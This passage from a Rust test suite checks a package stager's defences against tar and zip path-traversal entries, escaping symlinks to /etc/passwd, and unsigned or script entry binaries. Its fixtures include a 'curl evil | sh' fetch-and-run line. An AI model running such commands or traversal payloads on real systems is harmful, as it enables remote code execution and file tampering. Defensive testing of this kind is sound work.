    /// A dangling target, a `..` target, and a name that collides with an extracted
    /// entry are each refused with nothing staged.
    #[cfg(unix)]
    #[test]
    fn links_lay_relative_symlinks_under_bin_and_fold_into_the_root() {
        let d = tmp("vendor-links");
        let gz = d.join("emacs.tar.gz");
        std::fs::write(
            &gz,
            gzip_bytes(&tar_bytes(&[
                (
                    "Emacs.app/Contents/MacOS/Emacs",
                    b'0',
                    "",
                    b"#!/bin/sh\necho emacs\n",
                    0o755,
                ),
                (
                    "Emacs.app/Contents/MacOS/bin/emacsclient",
                    b'0',
                    "",
                    b"#!/bin/sh\necho client\n",
                    0o755,
                ),
                ("bin/taken", b'0', "", b"already here", 0o644),
            ])),
        )
        .unwrap();
        let replica = d.join("replica");
        lay(
            &replica,
            "Emacs.app/Contents/MacOS/Emacs",
            b"#!/bin/sh\necho emacs\n",
            0o755,
        );
        lay(
            &replica,
            "Emacs.app/Contents/MacOS/bin/emacsclient",
            b"#!/bin/sh\necho client\n",
            0o755,
        );
        lay(&replica, "bin/taken", b"already here", 0o644);
        lay_link(&replica, "bin/emacs", "../Emacs.app/Contents/MacOS/Emacs");
        lay_link(
            &replica,
            "bin/emacsclient",
            "../Emacs.app/Contents/MacOS/bin/emacsclient",
        );
        let expected = tree_root(&replica).unwrap();

        let mut art = vendor_artifact(&gz, "tar-gz", &expected);
        art.links
            .insert("emacs".into(), "Emacs.app/Contents/MacOS/Emacs".into());
        art.links.insert(
            "emacsclient".into(),
            "Emacs.app/Contents/MacOS/bin/emacsclient".into(),
        );
        let build = d.join("store/emacs/18");
        verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap();
        assert_eq!(
            std::fs::read_link(build.join("bin/emacs")).unwrap(),
            Path::new("../Emacs.app/Contents/MacOS/Emacs")
        );
        assert_eq!(
            std::fs::read(build.join("bin/emacs")).unwrap(),
            b"#!/bin/sh\necho emacs\n"
        );
        assert_eq!(
            std::fs::read(build.join("bin/emacsclient")).unwrap(),
            b"#!/bin/sh\necho client\n"
        );
        assert_eq!(tree_root(&build).unwrap(), expected);
        // Without the links the root is different: the fold really carries them.
        let plain = vendor_artifact(&gz, "tar-gz", &expected);
        let err = verify_and_stage(&plain, &gz, &d.join("store/plain/18"), &StageHooks::NONE)
            .unwrap_err();
        assert!(
            matches!(err, StageError::TreeRootMismatch { .. }),
            "{err:?}"
        );

        let refused: &[(&str, &str, &str)] = &[
            ("dangling", "emacs", "Emacs.app/Contents/MacOS/Nope"),
            ("dotdot", "emacs", "../outside"),
            (
                "absolute",
                "emacs",
                "/Applications/Emacs.app/Contents/MacOS/Emacs",
            ),
            ("collides", "taken", "Emacs.app/Contents/MacOS/Emacs"),
            ("bad-name", "bin/emacs", "Emacs.app/Contents/MacOS/Emacs"),
        ];
        for (label, name, target) in refused {
            let mut art = vendor_artifact(&gz, "tar-gz", &expected);
            art.links.insert((*name).into(), (*target).into());
            let build = d.join(format!("store/{label}/18"));
            let err = verify_and_stage(&art, &gz, &build, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
            assert!(!build.exists(), "{label}: nothing staged");
            assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A slip in a vendor archive aborts the stage in extraction — nothing outside the
    /// scratch, no scratch left, and (for a re-stage) the installed build untouched —
    /// through the gzip lane and the zip lane alike.
    #[cfg(unix)]
    #[test]
    fn a_slip_in_a_vendor_archive_aborts_before_the_swap_in_every_lane() {
        let d = tmp("vendor-slip");
        let expected = gh_expected_root(&d);
        // Install the good gzip build first, so there is something to survive.
        let good = d.join("gh.tar.gz");
        std::fs::write(&good, gzip_bytes(&gh_tar())).unwrap();
        let mut art = vendor_artifact(&good, "tar-gz", &expected);
        art.strip_components = 1;
        let build = d.join("store/gh/18");
        verify_and_stage(&art, &good, &build, &StageHooks::NONE).unwrap();
        let witness = build.join("this-tree-survived");
        std::fs::write(&witness, b"old").unwrap();

        let slip_tar = tar_bytes(&[
            ("top/ok", b'0', "", b"fine", 0o644),
            ("top/../../escape", b'0', "", b"pwned", 0o644),
        ]);
        let gz = d.join("slip.tar.gz");
        std::fs::write(&gz, gzip_bytes(&slip_tar)).unwrap();
        let zip = d.join("slip.zip");
        std::fs::write(
            &zip,
            zip_bytes(
                &[
                    ZipMember {
                        name: "top/ok",
                        mode: 0o100_644,
                        data: b"fine",
                        deflate: false,
                    },
                    ZipMember {
                        name: "top/../../escape",
                        mode: 0o100_644,
                        data: b"pwned",
                        deflate: true,
                    },
                    ZipMember {
                        name: "top/bin/x",
                        mode: 0o120_777,
                        data: b"../../../etc/passwd",
                        deflate: false,
                    },
                ],
                false,
            ),
        )
        .unwrap();
        for (label, archive, payload) in [("gz", &gz, "tar-gz"), ("zip", &zip, "zip")] {
            let mut art = vendor_artifact(archive, payload, "");
            art.strip_components = 1;
            let err = verify_and_stage(&art, archive, &build, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Extract(_)), "{label}: {err:?}");
            assert!(witness.exists(), "{label}: the installed build survived");
            assert!(crate::store::build_is_complete(&build), "{label}");
            assert!(scratch_beside(&build).is_empty(), "{label}: no scratch");
            assert!(
                !d.join("escape").exists() && !d.join("store/escape").exists(),
                "{label}"
            );
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// An unknown payload lane is refused before any byte is extracted; nothing staged.
    #[test]
    fn an_unknown_payload_lane_is_refused_before_extraction() {
        let b = bundle("unknown-payload");
        let mut art = b.art.clone();
        art.kind = "binary".into();
        art.protocol = "https".into();
        art.payload = "pkg".into();
        let build = b.build();
        let err = verify_and_stage(&art, &b.archive, &build, &StageHooks::NONE).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(!build.exists());
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// Detaches every disk image attached from under `dir` when it goes out of scope —
    /// on EVERY path out of a test: an early `return`, an assertion panic, or success.
    ///
    /// It exists because the leak it cleans up OUTLIVES the process. A failed
    /// `hdiutil attach` leaves the image's devices attached with nothing mounted on
    /// them; until [`Mount`] learned to reclaim those, they survived until the machine
    /// was rebooted or a human ran `hdiutil detach` by hand, and each one made the next
    /// attach of the same image fail `Resource busy`.
    #[cfg(target_os = "macos")]
    struct DetachAll {
        prefixes: Vec<PathBuf>,
    }

    #[cfg(target_os = "macos")]
    impl DetachAll {
        /// Guard everything attached from under `dir` — by the path as spelled and as
        /// resolved, since `/var/folders/…` and `/private/var/folders/…` are the same
        /// directory and `hdiutil` echoes whichever spelling it was handed.
        fn over(dir: &Path) -> Self {
            let mut prefixes = vec![dir.to_path_buf()];
            match dir.canonicalize() {
                Ok(c) if c != *dir => prefixes.push(c),
                _ => {}
            }
            Self { prefixes }
        }

        /// The device nodes of every image `hdiutil info` still lists from under the
        /// guarded directory. Never panics: it runs from `Drop`, which may itself be
        /// running because an assertion already failed.
        fn leaked(&self) -> Vec<PathBuf> {
            let Ok(out) = std::process::Command::new("/usr/bin/hdiutil")
                .arg("info")
                .output()
            else {
                return Vec::new();
            };
            parse_hdiutil_info(&String::from_utf8_lossy(&out.stdout))
                .into_iter()
                .filter(|a| self.prefixes.iter().any(|p| a.image.starts_with(p)))
                .map(|a| a.node)
                .collect()
        }

        fn assert_clean(&self, what: &str) {
            let leaked = self.leaked();
            assert!(leaked.is_empty(), "{what}: still attached: {leaked:?}");
        }
    }

    #[cfg(target_os = "macos")]
    impl Drop for DetachAll {
        fn drop(&mut self) {
            for node in self.leaked() {
                let _ = std::process::Command::new("/usr/bin/hdiutil")
                    .args(["detach", "-force", "-quiet"])
                    .arg(&node)
                    .status();
            }
        }
    }

    /// `hdiutil info`'s report, parsed: the block a FAILED attach leaves behind — the
    /// image attached, every entity mounted NOWHERE — is recognised as a carcass with a
    /// device node to eject, while an image mounted somewhere that is not our mount
    /// point is left alone.
    ///
    /// This is the defect the `dmg` lane leaked on. `hdiutil attach` can exit non-zero
    /// having ALREADY attached the image (`Resource temporarily unavailable`, measured
    /// at 5 attempts in 20 on an idle Mac); the guard read that non-zero exit as
    /// "nothing attached" and the devices outlived the process. The report is the only
    /// place the carcass is visible, so the rule that reads it is pinned here rather
    /// than left to a test that has to lose a race to exercise it.
    #[cfg(target_os = "macos")]
    #[test]
    fn a_failed_attach_leaves_a_carcass_the_hdiutil_report_names() {
        const REPORT: &str = "framework       : 683.160.3
driver          : 683.160.3
images          : 3
================================================
image-path      : /Users//someone/Downloads/aterm-0.81.0.dmg
image-alias     : /Users//someone/Downloads/aterm-0.81.0.dmg
image-type      : read-only disk image
/dev/disk4\tGUID_partition_scheme\t
/dev/disk4s1\t48465300-0000-11AA-AA11-00306543ECAC\t/Volumes/aterm 0.81.0
================================================
image-path      : /tmp/stage/foo.dmg
image-alias     : /tmp/stage/foo.dmg
image-type      : UDIF read-only [write once]
/dev/disk5\tGUID_partition_scheme\t
/dev/disk5s1\t7C3457EF-0000-11AA-AA11-00306543ECAC\t
/dev/disk6\tEF57347C-0000-11AA-AA11-00306543ECAC\t
/dev/disk6s1\t41504653-0000-11AA-AA11-00306543ECAC\t
================================================
image-path      : /tmp/stage/bar.dmg
image-alias     : /tmp/stage/bar.dmg
/dev/disk7\tGUID_partition_scheme\t
/dev/disk7s1\t41504653-0000-11AA-AA11-00306543ECAC\t/tmp/stage/bar.mnt
";
        let all = parse_hdiutil_info(REPORT);
        assert_eq!(all.len(), 3, "one entry per attached image");
        assert_eq!(all[0].node, Path::new("/dev/disk4"));
        assert_eq!(
            all[0].mounted_at,
            vec![PathBuf::from("/Volumes/aterm 0.81.0")],
            "a mount point may hold spaces; the fields are tab-separated"
        );
        assert_eq!(
            all[1].node,
            Path::new("/dev/disk5"),
            "the image's OWN node, not the synthesised APFS container's"
        );
        assert!(
            all[1].mounted_at.is_empty(),
            "the carcass is attached and mounted nowhere: {:?}",
            all[1].mounted_at
        );

        let mine = |image: &str, point: &str| Mount {
            image: PathBuf::from(image),
            point: PathBuf::from(point),
            // Never armed: these guards must not shell out when they drop.
            attached: false,
        };
        assert_eq!(
            mine("/tmp/stage/foo.dmg", "/tmp/stage/foo.mnt").reclaimable(REPORT),
            vec![PathBuf::from("/dev/disk5")],
            "the carcass of OUR image is ours to eject"
        );
        assert_eq!(
            mine("/tmp/stage/bar.dmg", "/tmp/stage/bar.mnt").reclaimable(REPORT),
            vec![PathBuf::from("/dev/disk7")],
            "so is an image mounted at our own mount point"
        );
        assert!(
            mine(
                "/Users//someone/Downloads/aterm-0.81.0.dmg",
                "/tmp/stage/x.mnt"
            )
            .reclaimable(REPORT)
            .is_empty(),
            "an image the user has mounted elsewhere is NOT ours to yank"
        );
        assert!(
            mine("/tmp/stage/other.dmg", "/tmp/stage/other.mnt")
                .reclaimable(REPORT)
                .is_empty(),
            "an image we never attached is never touched"
        );
    }

    /// The `dmg` lane, for real: a tiny image is built with `hdiutil create` around
    /// a `Foo.app` (an executable, a `0600` file, an internal symlink) beside the usual
    /// `Applications` link and a README; the stage copies ONLY the bundle, preserves its
    /// modes and links, lays the row's `links`, detaches the image, and the root equals a
    /// hand-laid replica's walk. Zero or two apps at the root are refused — detached
    /// either way. Runs only where `hdiutil` exists (this Mac); skips elsewhere.
    #[cfg(target_os = "macos")]
    #[test]
    fn dmg_app_payload_stages_the_single_app_and_its_links() {
        use std::os::unix::fs::PermissionsExt as _;
        if !Path::new("/usr/bin/hdiutil").exists() || !Path::new("/usr/bin/ditto").exists() {
            eprintln!("skipping: hdiutil/ditto not available");
            return;
        }
        let d = tmp("vendor-dmg");
        // Armed BEFORE the first image exists, dropped after the last assertion: an
        // assertion that fires half way through must not leave an image attached.
        let leaks = DetachAll::over(&d);
        let src = d.join("src");
        lay(
            &src,
            "Foo.app/Contents/MacOS/foo",
            b"#!/bin/sh\necho foo\n",
            0o755,
        );
        lay(&src, "Foo.app/Contents/Info.plist", b"<plist/>", 0o644);
        lay(&src, "Foo.app/Contents/Resources/secret", b"s", 0o600);
        lay_link(&src, "Foo.app/Contents/current", "MacOS/foo");
        lay(&src, "README.txt", b"not copied", 0o644);
        lay_link(&src, "Applications", "/Applications");
        let dmg = d.join("foo.dmg");
        let status = std::process::Command::new("/usr/bin/hdiutil")
            .args(["create", "-quiet", "-srcfolder"])
            .arg(&src)
            .args(["-volname", "FooTest", "-format", "UDZO"])
            .arg(&dmg)
            .status()
            .unwrap();
        assert!(status.success(), "hdiutil create");

        let replica = d.join("replica");
        lay(
            &replica,
            "Foo.app/Contents/MacOS/foo",
            b"#!/bin/sh\necho foo\n",
            0o755,
        );
        lay(&replica, "Foo.app/Contents/Info.plist", b"<plist/>", 0o644);
        lay(&replica, "Foo.app/Contents/Resources/secret", b"s", 0o600);
        lay_link(&replica, "Foo.app/Contents/current", "MacOS/foo");
        lay_link(&replica, "bin/foo", "../Foo.app/Contents/MacOS/foo");
        let expected = tree_root(&replica).unwrap();

        let mut art = vendor_artifact(&dmg, "dmg", &expected);
        art.links
            .insert("foo".into(), "Foo.app/Contents/MacOS/foo".into());
        let build = d.join("store/foo/2026082601");
        verify_and_stage(&art, &dmg, &build, &StageHooks::NONE).unwrap();
        assert!(crate::store::build_is_complete(&build));
        assert_eq!(
            std::fs::read(build.join("bin/foo")).unwrap(),
            b"#!/bin/sh\necho foo\n"
        );
        assert_eq!(
            std::fs::read_link(build.join("Foo.app/Contents/current")).unwrap(),
            Path::new("MacOS/foo")
        );
        assert_eq!(
            std::fs::metadata(build.join("Foo.app/Contents/Resources/secret"))
                .unwrap()
                .permissions()
                .mode()
                & 0o7777,
            0o600,
            "dmg preserves mode bits"
        );
        assert!(
            !build.join("README.txt").exists(),
            "only the .app is copied"
        );
        assert!(!build.join("Applications").exists());
        assert_eq!(tree_root(&build).unwrap(), expected);
        assert!(scratch_beside(&build).is_empty());
        // The mount point (`<build>.incoming-<pid>.mnt`) is gone and the image is detached.
        let mounts: Vec<_> = std::fs::read_dir(build.parent().unwrap())
            .unwrap()
            .flatten()
            .filter(|e| e.file_name().to_string_lossy().ends_with(".mnt"))
            .collect();
        assert!(mounts.is_empty(), "no mount point left behind: {mounts:?}");
        leaks.assert_clean("the image must be detached");

        // Two apps at the root, and none: refused, detached, nothing staged.
        for (label, apps) in [("two", &["A.app", "B.app"][..]), ("none", &[][..])] {
            let src2 = d.join(format!("src-{label}"));
            for app in apps {
                lay(&src2, &format!("{app}/Contents/MacOS/x"), b"x", 0o755);
            }
            lay(&src2, "README.txt", b"r", 0o644);
            let dmg2 = d.join(format!("{label}.dmg"));
            let status = std::process::Command::new("/usr/bin/hdiutil")
                .args(["create", "-quiet", "-srcfolder"])
                .arg(&src2)
                .args(["-volname", "Bad", "-format", "UDZO"])
                .arg(&dmg2)
                .status()
                .unwrap();
            assert!(status.success(), "hdiutil create {label}");
            let art = vendor_artifact(&dmg2, "dmg", &expected);
            let build2 = d.join(format!("store/{label}/1"));
            let err = verify_and_stage(&art, &dmg2, &build2, &StageHooks::NONE).unwrap_err();
            assert!(matches!(err, StageError::Payload(_)), "{label}: {err:?}");
            assert!(!build2.exists(), "{label}");
            assert!(scratch_beside(&build2).is_empty(), "{label}");
            leaks.assert_clean(&format!("{label}: detached on the error path"));
        }

        // A link INSIDE the bundle that leaves the stage root — absolute, or `..` above
        // it — is refused after the copy and before the swap: an extraction-class
        // rejection naming the link, nothing staged, the image detached. A link that
        // climbs to the bundle's own root and back down is fine (frameworks do that).
        for (label, target, ok) in [
            ("abs-link", "/etc/passwd", false),
            ("up-link", "../../../../outside", false),
            ("in-root-link", "../../Bad.app/Contents/MacOS/x", true),
        ] {
            let src3 = d.join(format!("src-{label}"));
            lay(
                &src3,
                "Bad.app/Contents/MacOS/x",
                b"#!/bin/sh\nexit 0\n",
                0o755,
            );
            lay_link(&src3, "Bad.app/Contents/Resources/escape", target);
            let dmg3 = d.join(format!("{label}.dmg"));
            let status = std::process::Command::new("/usr/bin/hdiutil")
                .args(["create", "-quiet", "-srcfolder"])
                .arg(&src3)
                .args(["-volname", "Link", "-format", "UDZO"])
                .arg(&dmg3)
                .status()
                .unwrap();
            assert!(status.success(), "hdiutil create {label}");
            let replica3 = d.join(format!("replica-{label}"));
            lay(
                &replica3,
                "Bad.app/Contents/MacOS/x",
                b"#!/bin/sh\nexit 0\n",
                0o755,
            );
            lay_link(&replica3, "Bad.app/Contents/Resources/escape", target);
            let expected3 = tree_root(&replica3).unwrap();
            let art = vendor_artifact(&dmg3, "dmg", &expected3);
            let build3 = d.join(format!("store/{label}/1"));
            let res = verify_and_stage(&art, &dmg3, &build3, &StageHooks::NONE);
            if ok {
                res.unwrap_or_else(|e| panic!("{label}: an in-root link is admitted: {e}"));
                assert_eq!(
                    std::fs::read_link(build3.join("Bad.app/Contents/Resources/escape")).unwrap(),
                    Path::new(target),
                    "{label}: laid verbatim"
                );
            } else {
                let err = res.unwrap_err();
                assert!(
                    matches!(err, StageError::Extract(ExtractError::Rejected(_, _))),
                    "{label}: {err:?}"
                );
                assert!(
                    err.to_string().contains("Resources/escape"),
                    "{label}: names the link: {err}"
                );
                assert!(!build3.exists(), "{label}: nothing staged");
                assert!(scratch_beside(&build3).is_empty(), "{label}");
            }
            leaks.assert_clean(&format!("{label}: detached"));
        }
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A vendor record for the sidecar tests: the root it was handed, so the test can
    /// check the stage passed the root it verified.
    fn vendor_record(root: &str) -> Vec<(&'static str, Vec<u8>)> {
        let mut body = String::from("tree_root = \"");
        body.push_str(root);
        body.push_str("\"\n");
        vec![(crate::store::VENDOR_SIDECAR_SUFFIX, body.into_bytes())]
    }

    /// THE ORDER. `pre_swap` sees the verified `.incoming` tree while nothing is at the
    /// build path; the sidecars are rendered from the root the stage verified and are on
    /// disk beside the marked build; and the stage returns that same root.
    #[test]
    fn hooks_run_before_the_swap_and_sidecars_land_before_the_marker() {
        let b = bundle("hooks-order");
        let build = b.build();
        let seen: std::cell::RefCell<Vec<String>> = std::cell::RefCell::new(Vec::new());
        let pre_swap = |incoming: &Path| -> Result<(), StageError> {
            assert!(incoming.join("bin/ay").is_file(), "the verified tree");
            assert_ne!(incoming, build.as_path());
            assert!(!build.exists(), "nothing swapped yet");
            assert!(!crate::store::build_is_complete(&build));
            seen.borrow_mut().push("pre_swap".into());
            Ok(())
        };
        let sidecars = |root: &str| {
            seen.borrow_mut().push("sidecars".into());
            Ok(vendor_record(root))
        };
        let hooks = StageHooks {
            pre_swap: Some(&pre_swap),
            sidecars: Some(&sidecars),
        };
        let root = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert_eq!(root, b.art.tree_root, "the verified root comes back");
        assert_eq!(*seen.borrow(), ["pre_swap", "sidecars"]);
        assert!(crate::store::build_is_complete(&build));
        let record =
            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
        assert_eq!(
            std::fs::read_to_string(&record).unwrap(),
            String::from_utf8(vendor_record(&root).remove(0).1).unwrap()
        );
        assert!(scratch_beside(&build).is_empty());

        // Without hooks the same stage returns the same root and writes no sidecar.
        let plain = b.dir.join("store/ay/19");
        assert_eq!(
            verify_and_stage(&b.art, &b.archive, &plain, &StageHooks::NONE).unwrap(),
            root
        );
        assert!(
            !crate::store::sidecar_path(&plain, crate::store::VENDOR_SIDECAR_SUFFIX)
                .unwrap()
                .exists()
        );
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A `pre_swap` refusal is final before anything is published: no build, no marker,
    /// no sidecar, no scratch — and over an installed build, that build untouched and
    /// still complete.
    #[test]
    fn a_pre_swap_refusal_leaves_no_build_marker_or_sidecar() {
        let b = bundle("hooks-refuse");
        let build = b.build();
        let refuse = |_: &Path| -> Result<(), StageError> {
            Err(StageError::SignerRefused("bin/ay is not signed".into()))
        };
        let rendered = std::cell::Cell::new(false);
        let sidecars = |root: &str| {
            rendered.set(true);
            Ok(vendor_record(root))
        };
        let hooks = StageHooks {
            pre_swap: Some(&refuse),
            sidecars: Some(&sidecars),
        };
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
        assert_eq!(err.to_string(), "signer refused: bin/ay is not signed");
        assert!(!rendered.get(), "a refused tree has no record to render");
        assert!(!build.exists());
        assert!(!crate::store::build_is_complete(&build));
        assert!(
            !crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX)
                .unwrap()
                .exists()
        );
        assert!(scratch_beside(&build).is_empty());

        let (build, witness) = b.installed();
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::SignerRefused(_)), "{err:?}");
        assert!(
            witness.is_file(),
            "the installed tree was never swapped out"
        );
        assert!(crate::store::build_is_complete(&build));
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// THE GATE SEES ONLY VERIFIED BYTES: a tree whose root does not match the row is
    /// refused before `pre_swap` is ever asked about it.
    #[test]
    fn a_tree_root_mismatch_never_reaches_the_pre_swap_hook() {
        let b = bundle("hooks-badroot");
        let build = b.build();
        let asked = std::cell::Cell::new(false);
        let pre_swap = |_: &Path| -> Result<(), StageError> {
            asked.set(true);
            Ok(())
        };
        let hooks = StageHooks {
            pre_swap: Some(&pre_swap),
            sidecars: None,
        };
        let bad = artifact(&b.art.sha256, &"a".repeat(64));
        let err = verify_and_stage(&bad, &b.archive, &build, &hooks).unwrap_err();
        assert!(
            matches!(err, StageError::TreeRootMismatch { .. }),
            "{err:?}"
        );
        assert!(!asked.get(), "the hook saw an unverified tree");
        let err =
            verify_and_stage(&artifact("deadbeef", ""), &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::Sha256Mismatch { .. }), "{err:?}");
        assert!(!asked.get(), "the hook saw bytes that failed their digest");
        // Non-vacuity: the same hook on the honest row is asked.
        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert!(asked.get());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A sidecar the store would never reclaim is refused before the swap.
    #[test]
    fn a_sidecar_suffix_the_store_does_not_reclaim_is_refused_before_the_swap() {
        let b = bundle("hooks-suffix");
        let build = b.build();
        let sidecars = |_: &str| Ok(vec![(".bogus", b"x".to_vec())]);
        let hooks = StageHooks {
            pre_swap: None,
            sidecars: Some(&sidecars),
        };
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::Payload(_)), "{err:?}");
        assert!(err.to_string().contains(".bogus"), "{err}");
        assert!(!build.exists());
        assert!(scratch_beside(&build).is_empty());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// `.ready` IMPLIES THE SIDECARS. A sidecar that cannot be written stops the stage
    /// between the swap and the marker — the state a kill there leaves: the verified tree
    /// in place, unmarked, so it reads as not installed and is re-staged; the next stage
    /// that can write the record marks it.
    #[test]
    fn a_stage_stopped_between_swap_and_marker_leaves_no_complete_build() {
        let b = bundle("hooks-kill");
        let build = b.build();
        let record =
            crate::store::sidecar_path(&build, crate::store::VENDOR_SIDECAR_SUFFIX).unwrap();
        // A directory where the record goes: the rename onto it fails.
        std::fs::create_dir_all(&record).unwrap();
        let sidecars = |root: &str| Ok(vendor_record(root));
        let hooks = StageHooks {
            pre_swap: None,
            sidecars: Some(&sidecars),
        };
        let err = verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap_err();
        assert!(matches!(err, StageError::Io(_)), "{err:?}");
        assert!(build.join("bin/ay").is_file(), "the swap had happened");
        assert!(
            !crate::store::build_is_complete(&build),
            "but nothing marked it"
        );
        let strays: Vec<String> = std::fs::read_dir(build.parent().unwrap())
            .unwrap()
            .flatten()
            .filter_map(|e| e.file_name().to_str().map(str::to_string))
            .filter(|n| n.contains(".tmp-"))
            .collect();
        assert!(strays.is_empty(), "no temp left: {strays:?}");

        std::fs::remove_dir(&record).unwrap();
        verify_and_stage(&b.art, &b.archive, &build, &hooks).unwrap();
        assert!(crate::store::build_is_complete(&build));
        assert!(record.is_file());
        let _ = std::fs::remove_dir_all(&b.dir);
    }

    /// A Developer-ID-signed agent binary on this machine, if one is installed: Claude
    /// Code's own copies under `~/.local/share/claude/versions/`, signed by Anthropic's
    /// team `Q6L2SF6YDW`.
    #[cfg(target_os = "macos")]
    fn a_signed_claude() -> Option<PathBuf> {
        let versions =
            PathBuf::from(std::env::var_os("HOME")?).join(".local/share/claude/versions");
        let preferred = versions.join("2.1.280");
        if preferred.is_file() {
            return Some(preferred);
        }
        let mut found: Vec<PathBuf> = std::fs::read_dir(&versions)
            .ok()?
            .flatten()
            .map(|e| e.path())
            .filter(|p| std::fs::symlink_metadata(p).is_ok_and(|m| m.is_file()))
            .collect();
        found.sort();
        found.pop()
    }

    /// `8 + 20 * nfat` bytes of universal header naming `nfat` dummy arm64 slices.
    #[cfg(unix)]
    fn fat_macho(nfat: u32) -> Vec<u8> {
        let mut bytes = 0xCAFE_BABEu32.to_be_bytes().to_vec();
        bytes.extend_from_slice(&nfat.to_be_bytes());
        for i in 0..nfat {
            for word in [0x0100_000C, 0, 0x1_0000 + i * 0x1000, 0x1000, 12] {
                bytes.extend_from_slice(&u32::to_be_bytes(word));
            }
        }
        bytes
    }

    /// A thin 64-bit Mach-O header with nothing signed behind it.
    #[cfg(unix)]
    fn thin_macho() -> Vec<u8> {
        let mut thin = 0xCFFA_EDFEu32.to_be_bytes().to_vec();
        thin.extend_from_slice(&[0u8; 60]);
        thin
    }

    /// Run [`check_developer_id`] over `tree` for `exposes`, with codesign replaced by
    /// `verdict` (asked with the path relative to `tree`); returns the result and the
    /// relative paths asked about, in order.
    #[cfg(unix)]
    fn gate_with(
        tree: &Path,
        exposes: &[&str],
        verdict: &dyn Fn(&str) -> Result<(), aterm_update_core::codesign::CodesignError>,
    ) -> (Result<(), StageError>, Vec<String>) {
        let asked = std::cell::RefCell::new(Vec::new());
        let verify = |path: &Path, _deadline: std::time::Instant| {
            let rel = path
                .strip_prefix(tree)
                .unwrap()
                .to_string_lossy()
                .replace('\\', "/");
            asked.borrow_mut().push(rel.clone());
            verdict(&rel)
        };
        let exposes: Vec<String> = exposes.iter().map(|t| (*t).to_string()).collect();
        let result = check_developer_id(tree, "Q6L2SF6YDW", &exposes, &verify);
        (result, asked.into_inner())
    }

    #[cfg(unix)]
    fn unsigned() -> aterm_update_core::codesign::CodesignError {
        aterm_update_core::codesign::CodesignError::Refused {
            code: Some(1),
            stderr: "x: code object is not signed at all\n".into(),
        }
    }

    /// THE PASS PATH, on every machine: a codex-shaped tree whose Mach-Os all verify
    /// passes — each Mach-O asked about exactly once, in order, fat or thin, the data
    /// files not at all. The genuine package's executable-mode JSON arrives here demoted
    /// to 0644 by the vendor lane ([`crate::macho::demote_foreign_executables`]).
    #[cfg(unix)]
    #[test]
    fn the_gate_passes_a_tree_whose_every_macho_verifies_and_asks_about_each_once() {
        let d = tmp("devid-pass");
        lay(&d, "bin/codex", &thin_macho(), 0o755);
        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
        lay(&d, "codex-path/rg", &fat_macho(2), 0o755);
        lay(
            &d,
            "codex-resources/voice/runtime.json",
            b"{\"a\": 1}\n",
            0o644,
        );
        lay(&d, "codex-resources/voice/NOTICE.md", b"# Notices\n", 0o644);
        let (result, asked) = gate_with(&d, &["codex"], &|_| Ok(()));
        result.expect("every Mach-O verifies and the entry is one of them");
        assert_eq!(
            asked,
            ["bin/codex", "bin/codex-code-mode-host", "codex-path/rg"]
        );
        let _ = std::fs::remove_dir_all(&d);
    }

    /// A UNIVERSAL FILE OF ANY ARCH COUNT IS VERIFIED. A 45- or 200-arch wrapper (which
    /// the kernel executes) beside a genuinely signed entry is asked about and refused
    /// when it does not verify — not skipped as a Java class file.
    #[cfg(unix)]
    #[test]
    fn a_fat_file_of_any_arch_count_beside_a_signed_entry_is_verified() {
        for nfat in [45u32, 200] {
            let d = tmp("devid-fat");
            lay(&d, "bin/claude", &thin_macho(), 0o755);
            lay(&d, "codex-path/rg", &fat_macho(nfat), 0o755);
            let (result, asked) = gate_with(&d, &["claude"], &|rel| {
                if rel == "bin/claude" {
                    Ok(())
                } else {
                    Err(unsigned())
                }
            });
            match result {
                Err(StageError::SignerRefused(m)) => assert!(
                    m.starts_with("codex-path/rg is not signed by Developer ID team Q6L2SF6YDW"),
                    "{nfat}: {m}"
                ),
                other => panic!("{nfat}: {other:?}"),
            }
            assert_eq!(asked, ["bin/claude", "codex-path/rg"], "{nfat}");
            let _ = std::fs::remove_dir_all(&d);
        }
    }

    /// THE ENTRY IS BOUND. What a shim runs (`bin/<tool>` for each exposed tool) must be
    /// one of the verified Mach-Os: a shebang-less text entry, a missing one, or a link
    /// beside a genuinely signed decoy is refused — as is an interpreter-script helper.
    #[cfg(unix)]
    #[test]
    fn an_entry_that_is_not_a_verified_macho_or_a_script_helper_is_refused() {
        let pass = |_: &str| -> Result<(), aterm_update_core::codesign::CodesignError> { Ok(()) };
        let refused_as =
            |d: &Path, exposes: &[&str], want: &str| match gate_with(d, exposes, &pass).0 {
                Err(StageError::SignerRefused(m)) => assert!(m.starts_with(want), "{m}"),
                other => panic!("{want}: {other:?}"),
            };
        let entry_refusal = "bin/codex is not a Mach-O in the staged tree";

        let d = tmp("devid-entry");
        lay(&d, "bin/codex-code-mode-host", &thin_macho(), 0o755);
        lay(&d, "bin/codex", b"curl evil | sh\n", 0o755);
        refused_as(&d, &["codex"], entry_refusal);

        std::fs::remove_file(d.join("bin/codex")).unwrap();
        refused_as(&d, &["codex"], entry_refusal);

        lay(&d, "payload.txt", b"curl evil | sh\n", 0o755);
